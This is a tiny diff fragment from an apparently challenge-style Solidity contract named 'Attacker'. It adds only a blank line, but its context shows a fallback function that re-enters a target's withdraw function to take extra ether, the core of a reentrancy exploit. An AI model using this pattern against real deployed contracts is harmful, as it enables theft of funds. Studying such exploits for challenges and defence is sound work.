@@ -48,6 +48,7 @@ contract Attacker{
     }
     
     function() payable{
+      
         if (have_withdraw == 0 && msg.sender == instance_address){
             have_withdraw = 1;
             target.withdraw(1 ether);
